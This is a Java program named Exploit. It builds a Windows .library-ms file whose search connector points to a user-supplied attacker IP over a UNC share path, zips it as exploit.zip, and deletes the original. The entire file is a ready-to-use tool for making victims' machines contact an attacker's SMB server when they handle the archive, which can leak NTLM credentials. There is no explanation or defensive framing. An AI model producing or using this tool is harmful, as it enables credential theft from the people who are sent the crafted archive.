import java.io.*;
import java.util.Scanner;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Exploit {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        System.out.print("Enter your file name: ");
        String fileName = scanner.nextLine();

        System.out.print("Enter IP (EX: 192.168.1.162): ");
        String ipAddress = scanner.nextLine();

        String libraryContent = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\n"
                + "  <searchConnectorDescriptionList>\n"
                + "    <searchConnectorDescription>\n"
                + "      <simpleLocation>\n"
                + "        <url>\\\\" + ipAddress + "\\shared</url>\n"
                + "      </simpleLocation>\n"
                + "    </searchConnectorDescription>\n"
                + "  </searchConnectorDescriptionList>\n"
                + "</libraryDescription>";

        String libraryFileName = fileName + ".library-ms";

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(libraryFileName))) {
            writer.write(libraryContent);
        } catch (IOException e) {
            System.err.println("Error writing file: " + e.getMessage());
            return;
        }

        try (FileOutputStream fos = new FileOutputStream("exploit.zip");
             ZipOutputStream zipOut = new ZipOutputStream(fos);
             FileInputStream fis = new FileInputStream(libraryFileName)) {

            ZipEntry zipEntry = new ZipEntry(libraryFileName);
            zipOut.putNextEntry(zipEntry);
            byte[] bytes = new byte[1024];
            int length;
            while ((length = fis.read(bytes)) >= 0) {
                zipOut.write(bytes, 0, length);
            }
        } catch (IOException e) {
            System.err.println("Error creating ZIP file: " + e.getMessage());
            return;
        }

        File libraryFile = new File(libraryFileName);
        if (libraryFile.exists()) {
            if (!libraryFile.delete()) {
                System.err.println("Warning: Could not delete " + libraryFileName);
            }
        }

        System.out.println("completed");
    }
}
